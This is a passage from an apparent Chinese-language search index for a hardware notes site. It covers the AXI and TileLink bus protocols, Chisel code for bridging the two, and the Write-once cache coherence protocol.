Burst\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u54cd\u5e94\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b</li> </ol> <p>\u200b\u7531\u4e8e\u200b AXI \u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8ba9\u200b Master \u200b\u53ef\u4ee5\u200b\u533a\u5206\u200b\u51fa\u200b B \u200b\u548c\u200b R Channel \u200b\u4e0a\u200b\u7684\u200b\u54cd\u5e94\u200b\u4e0e\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u8bf7\u6c42\u200b\u548c\u200b\u54cd\u5e94\u200b\u90fd\u200b\u9644\u5e26\u200b\u4e86\u200b\u4e00\u4e2a\u200b ID\uff0c\u200b\u90a3\u4e48\u200b Master \u200b\u5728\u200b\u8bf7\u6c42\u200b\u4e2d\u200b\u9644\u5e26\u200b\u4e86\u200b\u4ec0\u4e48\u200b ID\uff0cSlave \u200b\u5728\u200b\u54cd\u5e94\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u9644\u5e26\u200b\u76f8\u540c\u200b\u7684\u200b ID\u3002\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b ID \u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5176\u200b\u987a\u5e8f\u200b\u662f\u200b\u53d7\u200b\u4fdd\u8bc1\u200b\u7684\u200b\u3002</p> <p>AXI \u200b\u6709\u200b\u652f\u6301\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7684\u200b\u6269\u5c55\u200b\uff1aACE\uff0c\u200b\u5176\u200b\u5185\u5bb9\u200b\u5728\u200b \u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#tilelink","title":"TileLink","text":"<p>TileLink \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u662f\u200b SiFive \u200b\u516c\u53f8\u200b\u63d0\u51fa\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5728\u200b Rocket Chip \u200b\u76f8\u5173\u200b\u7684\u200b\u9879\u76ee\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u6bd4\u8f83\u200b\u5e7f\u6cdb\u200b\u3002\u200b\u6839\u636e\u200b TileLink Spec 1.8.0\uff0cTileLink \u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u4e09\u79cd\u200b\uff1a</p> <ul> <li>TL-UL: \u200b\u53ea\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\uff0c\u200b\u4e0d\u200b\u652f\u6301\u200b burst\uff0c\u200b\u7c7b\u6bd4\u200b AXI-Lite</li> <li>TL-UH\uff1a\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\uff0c\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u9884\u53d6\u200b\uff0c\u200b\u652f\u6301\u200b burst\uff0c\u200b\u7c7b\u6bd4\u200b AXI+ATOP\uff08AXI5 \u200b\u5f15\u5165\u200b\u7684\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\uff09</li> <li>TL-C\uff1a\u200b\u5728\u200b TL-UH \u200b\u57fa\u7840\u200b\u4e0a\u200b\u652f\u6301\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI+ACE/CHI</li> </ul> <p>\u200b\u672c\u6587\u200b\u4e3b\u8981\u200b\u8ba8\u8bba\u200b\u524d\u200b\u4e24\u79cd\u200b\uff0cTL-C \u200b\u7684\u200b\u5185\u5bb9\u200b\u5728\u200b \u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#_4","title":"\u63a5\u53e3","text":"<p>TileLink Uncached(TL-UL \u200b\u548c\u200b TL-UH) \u200b\u5305\u62ec\u200b\u4e86\u200b\u4e24\u4e2a\u200b channel\uff1a</p> <ul> <li>A channel: M-&gt;S \u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI \u200b\u7684\u200b AR/AW/W</li> <li>D channel: S-&gt;M \u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI \u200b\u7684\u200b R/B</li> </ul> <p>\u200b\u56e0\u6b64\u200b TileLink \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53ea\u80fd\u200b\u53d1\u9001\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u800c\u200b AXI \u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5728\u200b AR \u200b\u548c\u200b AW channel \u200b\u4e0a\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u8bf7\u6c42\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <ul> <li>\u200b\u8bfb\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Get\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAckData</li> <li>\u200b\u5199\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b PutFullData/PutPartialData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u662f\u200b\u53d1\u9001\u200b AccessAck</li> <li>\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b ArithmeticData/LogicalData\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAckData</li> <li>\u200b\u9884\u53d6\u200b\u64cd\u4f5c\u200b\uff1aM-&gt;S \u200b\u5728\u200b A channel \u200b\u4e0a\u200b\u53d1\u9001\u200b Intent\uff0cS-&gt;M \u200b\u5728\u200b D channel \u200b\u4e0a\u200b\u53d1\u9001\u200b AccessAck</li> </ul>"},{"location":"hardware/bus_protocol.html#axi_1","title":"\u548c\u200b AXI \u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u548c\u200b AXI \u200b\u5bf9\u6bd4\u200b\uff0cTileLink \u200b\u628a\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5408\u5e76\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u8bfb\u5199\u200b\u8bf7\u6c42\u200b\u90fd\u200b\u901a\u8fc7\u200b A channel \u200b\u53d1\u9001\u200b\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u54cd\u5e94\u200b\u90fd\u200b\u901a\u8fc7\u200b D channel \u200b\u56de\u590d\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7b80\u5316\u200b\u4e86\u200b\u786c\u4ef6\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b CPU \u200b\u5e0c\u671b\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u5927\u91cf\u200b\u7684\u200b\u8bfb\u5199\u200b\uff0c\u200b\u53ef\u80fd\u200b AXI \u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b TileLink \u200b\u548c\u200b AXI \u200b\u534f\u8bae\u200b\u7684\u200b\u6865\u63a5\u200b\u6a21\u5757\u200b\u7684\u200b\u5b9e\u73b0\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u9488\u5bf9\u200b AXI4ToTL \u200b\u6a21\u5757\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e0b\u200b\u5982\u4f55\u200b\u628a\u200b\u4e00\u4e2a\u200b AXI4 Master \u200b\u8f6c\u6362\u200b\u4e3a\u200b TileLink\u3002</p> <p>\u200b\u9488\u5bf9\u200b AXI4 \u200b\u548c\u200b TileLink \u200b\u7684\u200b\u533a\u522b\u200b\u8fdb\u884c\u200b\u8bbe\u8ba1\u200b\uff1a\u200b\u4e00\u4e2a\u200b\u662f\u200b\u8bfb\u5199\u200b channel \u200b\u5408\u5e76\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u4e00\u4e2a\u200b Arbiter\uff1b\u200b\u5176\u6b21\u200b AXI4 \u200b\u4e2d\u200b AW \u200b\u548c\u200b W \u200b\u662f\u200b\u5206\u5f00\u200b\u7684\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u6a21\u5757\u200b\u5e76\u200b\u4e0d\u200b\u8003\u8651\u200b Burst \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u800c\u662f\u200b\u7531\u200b AXI4Fragmenter \u200b\u6765\u200b\u8fdb\u884c\u200b\u62c6\u5206\u200b\uff0c\u200b\u5373\u200b\u6dfb\u52a0\u200b\u82e5\u5e72\u4e2a\u200b AW beat\uff0c\u200b\u548c\u200b W \u200b\u8fdb\u884c\u200b\u914d\u5bf9\u200b\u3002</p> <p>\u200b\u5177\u4f53\u200b\u5230\u200b\u4ee3\u7801\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b AR channel \u200b\u5bf9\u5e94\u200b\u5230\u200b \u200b\u5230\u200b A channel \u200b\u4e0a\u200b\uff1a</p> <pre><code>val r_out = Wire(out.a)\nr_out.valid := in.ar.valid\nr_out.bits :&lt;= edgeOut.Get(r_id, r_addr, r_size)._2\n</code></pre> <p>\u200b\u7136\u540e\u200b AW+W channel \u200b\u4e5f\u200b\u8fde\u63a5\u200b \u200b\u5230\u200b A channel\uff0c\u200b\u7531\u4e8e\u200b\u4e0d\u7528\u200b\u8003\u8651\u200b burst \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5728\u200b aw \u200b\u548c\u200b w \u200b\u540c\u65f6\u200b valid \u200b\u7684\u200b\u65f6\u5019\u200b\u624d\u200b\u8ba4\u4e3a\u200b\u6709\u200b\u8bf7\u6c42\u200b\u3002</p> <pre><code>val w_out = Wire(out.a)\nin.aw.ready := w_out.ready &amp;&amp; in.w.valid &amp;&amp; in.w.bits.last\nin.w.ready  := w_out.ready &amp;&amp; in.aw.valid\nw_out.valid := in.aw.valid &amp;&amp; in.w.valid\nw_out.bits :&lt;= edgeOut.Put(w_id, w_addr, w_size, in.w.bits.data, in.w.bits.strb)._2\n</code></pre> <p>\u200b\u4e3a\u4e86\u200b\u533a\u5206\u200b\u8bf7\u6c42\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u8bfb\u5199\u200b\u7684\u200b id \u200b\u589e\u52a0\u200b\u4e86\u200b\u82e5\u5e72\u4f4d\u200b\uff0c\u200b\u6700\u4f4e\u200b\u4f4d\u200b 0 \u200b\u8868\u793a\u200b\u8bfb\u200b\uff0c1 \u200b\u8868\u793a\u200b\u5199\u200b\uff0c\u200b\u5269\u4e0b\u200b\u51e0\u4f4d\u200b\u662f\u200b\u8bf7\u6c42\u200b\u7f16\u53f7\u200b\uff0c\u200b\u8fd9\u6837\u200b\u53d1\u51fa\u200b\u53bb\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b id \u200b\u7684\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u7136\u540e\u200b\uff0c\u200b\u628a\u200b\u8bfb\u200b\u548c\u200b\u5199\u200b\u7684\u200b A channel \u200b\u8fde\u63a5\u200b\u5230\u200b Arbiter \u200b\u4e0a\u200b\uff1a</p> <pre><code>TLArbiter(TLArbiter.roundRobin)(out.a, (UInt(0), r_out), (in.aw.bits.len, w_out))\n</code></pre> <p>\u200b\u5176\u4f59\u200b\u7684\u200b\u90e8\u5206\u200b\u5219\u200b\u662f\u200b\u5bf9\u200b D channel \u200b\u8fdb\u884c\u200b\u5224\u65ad\u200b\uff0c\u200b\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u8f6c\u7ed9\u200b R channel\uff0c\u200b\u6ca1\u6709\u200b\u6570\u636e\u200b\u7684\u200b\u8f6c\u7ed9\u200b B channel\uff1a</p> <pre><code>out.d.ready := Mux(d_hasData, ok_r.ready, ok_b.ready)\nok_r.valid := out.d.valid &amp;&amp; d_hasData\nok_b.valid := out.d.valid &amp;&amp; !d_hasData\n</code></pre> <p>\u200b\u6700\u540e\u200b\u5904\u7406\u200b\u4e86\u200b\u4e00\u4e0b\u200b TileLink \u200b\u548c\u200b AXI4 \u200b\u5bf9\u200b\u5199\u200b\u8bf7\u6c42\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\u7684\u200b\u533a\u522b\u200b\uff1aTileLink \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7b2c\u4e00\u4e2a\u200b burst beat \u200b\u5c31\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\uff0c\u200b\u800c\u200b AXI4 \u200b\u9700\u8981\u200b\u5728\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b burst beat \u200b\u4e4b\u540e\u200b\u8fd4\u56de\u200b\u786e\u8ba4\u200b\u3002</p> <p>\u200b\u518d\u200b\u6765\u770b\u200b\u4e00\u4e0b\u200b\u53cd\u8fc7\u6765\u200b\u7684\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5373\u200b\u4ece\u200b TileLink Master \u200b\u5230\u200b AXI\u3002\u200b\u7531\u4e8e\u200b TileLink \u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b83\u200b\u9996\u5148\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u865a\u6784\u200b\u7684\u200b arw channel\uff0c\u200b\u53ef\u4ee5\u200b\u7406\u89e3\u200b\u4e3a\u200b\u5408\u5e76\u200b\u4e86\u200b ar \u200b\u548c\u200b aw channel \u200b\u7684\u200b AXI4\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u8ba1\u200b\u5728\u200b SpinalHDL \u200b\u7684\u200b\u4ee3\u7801\u200b\u4e2d\u200b\u4e5f\u200b\u80fd\u200b\u770b\u5230\u200b\u3002\u200b\u7136\u540e\u200b\u518d\u200b\u6839\u636e\u200b\u662f\u5426\u662f\u200b\u5199\u5165\u200b\uff0c\u200b\u5206\u522b\u200b\u8fde\u63a5\u200b\u5230\u200b ar \u200b\u548c\u200b aw channel\uff1a</p> <pre><code>val queue_arw = Queue.irrevocable(out_arw, entries=depth, flow=combinational)\nout.ar.bits := queue_arw.bits\nout.aw.bits := queue_arw.bits\nout.ar.valid := queue_arw.valid &amp;&amp; !queue_arw.bits.wen\nout.aw.valid := queue_arw.valid &amp;&amp;  queue_arw.bits.wen\nqueue_arw.ready := Mux(queue_arw.bits.wen, out.aw.ready, out.ar.ready)\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u5904\u7406\u200b\u4e86\u200b aw \u200b\u548c\u200b w \u200b\u7684\u200b valid \u200b\u4fe1\u53f7\u200b\uff1a</p> <pre><code>in.a.ready := !stall &amp;&amp; Mux(a_isPut, (doneAW || out_arw.ready) &amp;&amp; out_w.ready, out_arw.ready)\nout_arw.valid := !stall &amp;&amp; in.a.valid &amp;&amp; Mux(a_isPut, !doneAW &amp;&amp; out_w.ready, Bool(true))\nout_w.valid := !stall &amp;&amp; in.a.valid &amp;&amp; a_isPut &amp;&amp; (doneAW || out_arw.ready)\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5728\u200b TileLink \u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b burst \u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b a channel \u200b\u4e0a\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u800c\u200b AXI4 \u200b\u4e2d\u200b\uff0c\u200b\u53ea\u6709\u200b\u7b2c\u4e00\u4e2a\u200b burst \u200b\u6709\u200b aw \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u6240\u6709\u200b burst \u200b\u90fd\u200b\u6709\u200b w \u200b\u8bf7\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u7528\u200b doneAW \u200b\u4fe1\u53f7\u200b\u6765\u200b\u8fdb\u884c\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\uff0c\u200b\u8981\u200b\u628a\u200b b \u200b\u548c\u200b r channel \u200b\u4e0a\u200b\u7684\u200b\u7ed3\u679c\u200b\u8fde\u63a5\u200b\u5230\u200b d channel\uff0c\u200b\u6839\u636e\u200b\u4e0a\u9762\u200b\u7684\u200b\u7ecf\u9a8c\u200b\uff0c\u200b\u8fd9\u91cc\u200b \u200b\u53c8\u200b\u662f\u200b\u4e00\u4e2a\u200b arbitration\uff1a</p> <pre><code>val r_wins = (out.r.valid &amp;&amp; b_delay =/= UInt(7)) || r_holds_d\nout.r.ready := in.d.ready &amp;&amp; r_wins\nout.b.ready := in.d.ready &amp;&amp; !r_wins\nin.d.valid := Mux(r_wins, out.r.valid, out.b.valid)\n</code></pre> <p>\u200b\u6700\u540e\u200b\u8fd8\u200b\u5904\u7406\u200b\u4e86\u200b\u4e00\u4e0b\u200b\u8bf7\u6c42\u200b\u548c\u200b\u7ed3\u679c\u200b\u987a\u5e8f\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html","title":"\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae","text":"<p>\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u591a\u6838\u200b CPU \u200b\u4e2d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u6838\u5fc3\u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u8fd9\u4e9b\u200b\u7f13\u5b58\u200b\u7684\u200b\u6570\u636e\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#_2","title":"\u7406\u8bba\u200b\u5206\u6790","text":"<p>\u200b\u9996\u5148\u200b\u4ece\u200b\u7406\u8bba\u200b\u7684\u200b\u89d2\u5ea6\u200b\uff0c\u200b\u5206\u6790\u200b\u5982\u4f55\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u3002</p>"},{"location":"hardware/cache_coherence_protocol.html#write-invalidate-write-update","title":"Write-invalidate \u200b\u548c\u200b Write-update","text":"<p>\u200b\u6700\u200b\u57fa\u7840\u200b\u7684\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u601d\u60f3\u200b\u6709\u200b\u4e24\u79cd\u200b\uff1a</p> <ol> <li>Write-invalidate\uff1a\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c06\u200b\u5176\u4ed6\u200b Cache \u200b\u4e2d\u200b\u8fd9\u6761\u200b Cache Line \u200b\u8bbe\u200b\u4e3a\u200b Invalid</li> <li>Write-update\uff1a\u200b\u5199\u5165\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u628a\u200b\u65b0\u200b\u7684\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u6709\u200b\u8fd9\u6761\u200b Cache Line \u200b\u7684\u200b\u5176\u4ed6\u200b Cache</li> </ol>"},{"location":"hardware/cache_coherence_protocol.html#write-once","title":"Write-once \u200b\u534f\u8bae","text":"<p>Write-once \u200b\u534f\u8bae\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u56db\u4e2a\u200b\u72b6\u6001\u200b\uff1a</p> <ol> <li>Invalid\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u4e0d\u200b\u5408\u6cd5\u200b</li> <li>Valid\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u5e76\u200b\u53ef\u80fd\u200b\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u4fee\u6539\u200b</li> <li>Reserved\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4e0d\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u540c\u65f6\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u66f4\u6539\u200b</li> <li>Dirty\uff1a\u200b\u8868\u793a\u200b\u8fd9\u4e2a\u200b\u5757\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4e0d\u662f\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u6570\u636e\u200b\u505a\u200b\u4e86\u200b\u4fee\u6539\u200b\uff0c\u200b\u548c\u200b\u5185\u5b58\u200b\u4e0d\u540c\u200b\u3002</li> </ol> <p>\u200b\u53ef\u89c1\u200b\uff0c\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u5728\u200b R \u200b\u6216\u8005\u200b D\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u53ea\u80fd\u200b\u662f\u200b I\uff1b\u200b\u800c\u200b\u7f13\u5b58\u200b\u72b6\u6001\u200b\u662f\u200b V \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u7f13\u5b58\u200b\u5728\u200b V \u200b\u72b6\u6001\u200b\u3002</p> <p>Write-once \u200b\u534f\u8bae\u200b\u7684\u200b\u7279\u70b9\u200b\u662f\u200b\uff0c\u200b\u7b2c\u4e00\u6b21\u200b\u5199\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\uff08\u200b\u7c7b\u4f3c\u200b Write-through\uff09\uff0c\u200b\u8fde\u7eed\u200b\u5199\u5165\u200b\u5219\u200b\u53ea\u200b\u5199\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u7c7b\u4f3c\u200b Write-back\u3002</p> <p>\u200b\u5f53\u200b Read hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u72b6\u6001\u200b\u4e0d\u53d8\u200b\u3002</p> <pre><code>Read hit: The information is supplied by the current cache. No state\nchange.\n</code></pre> <p>\u200b\u5f53\u200b Read miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u67e5\u770b\u200b\u6240\u6709\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Valid/Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5c31\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbe\u200b\u4e3a\u200b Valid\uff0c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u4e5f\u200b\u8bbe\u4e3a\u200b Valid\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u5904\u4e8e\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd8\u8981\u200b\u628a\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002</p> <pre><code>Read miss: The data is read from main memory. The read is snooped by\nother caches; if any of them have the line in the Dirty state, the read\nis interrupted long enough to write the data back to memory before it is\nallowed to continue. Any copies in the Dirty or Reserved states are set\nto the Valid state.\n</code></pre> <p>\u200b\u5f53\u200b Write hit \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u662f\u200b Valid \u200b\u72b6\u6001\u200b\uff0c\u200b\u9996\u5148\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff0c\u200b\u628a\u200b\u5176\u4ed6\u200b Cache \u200b\u90fd\u200b\u8bbe\u4e3a\u200b Invalid\uff0c\u200b\u8fdb\u5165\u200b Reserved \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u7b2c\u4e00\u6b21\u200b\u5199\u200b\u662f\u200b Write-through\u3002\u200b\u5982\u679c\u200b\u662f\u200b Reserved/Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u5219\u200b\u4e0d\u200b\u4fee\u6539\u200b\u5185\u5b58\u200b\uff0c\u200b\u8fdb\u5165\u200b Dirty \u200b\u72b6\u6001\u200b\uff0c\u200b\u8fd9\u200b\u8868\u793a\u200b\u540e\u7eed\u200b\u7684\u200b\u5199\u5165\u200b\u90fd\u200b\u662f\u200b Write-back\u3002</p> <pre><code>Write hit: If the information in the cache is in Dirty or Reserved\nstate, the cache line is updated in place and its state is set to Dirty\nwithout updating memory. If the information is in Valid state, a\nwrite-through operation is executed updating the block and the memory\nand the block state is changed to Reserved. Other caches snoop the write\nand set their copies to Invalid.\n</code></pre> <p>\u200b\u5f53\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u884c\u4e3a\u200b Wikipedia \u200b\u4e0a\u200b\u548c\u200b\u4e0a\u8bfe\u200b\u8bb2\u200b\u7684\u200b\u4e0d\u200b\u4e00\u6837\u200b\u3002\u200b\u6309\u7167\u200b Wikipedia \u200b\u7684\u200b\u8bf4\u6cd5\u200b\uff0c\u200b\u9996\u5148\u200b\u6309\u7167\u200b Read miss \u200b\u5904\u7406\u200b\uff0c\u200b\u518d\u200b\u6309\u7167\u200b Write hit \u200b\u5904\u7406\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b Write Allocate \u200b\u7684\u200b\u601d\u8def\u200b\u3002\u200b\u5982\u679c\u200b\u662f\u200b\u8fd9\u6837\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9996\u5148\u200b\u4ece\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u6216\u8005\u200b\u5185\u5b58\u200b\u8bfb\u53d6\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u8bbe\u4e3a\u200b Invalid\uff0c\u200b\u628a\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff0c\u200b\u8fdb\u5165\u200b Reserved \u200b\u72b6\u6001\u200b\u3002\u200b\u76f8\u5f53\u4e8e\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u6309\u7167\u200b Write-through \u200b\u5b9e\u73b0\u200b\u3002</p> <pre><code>Write miss: A partial cache line write is handled as a read miss (if\nnecessary to fetch the unwritten portion of the cache line) followed by\na write hit. This leaves all other caches in the Invalid state, and the\ncurrent cache in the Reserved state.\n</code></pre> <p>\u200b\u6559\u6750\u200b\u4e0a\u200b\u5219\u200b\u662f\u200b Write miss \u200b\u7684\u200b\u65f6\u5019\u200b\u6309\u7167\u200b Write-back \u200b\u5904\u7406\u200b\u3002\u200b\u5982\u679c\u200b\u5176\u4ed6\u200b\u7f13\u5b58\u200b\u90fd\u200b\u662f\u200b Invalid 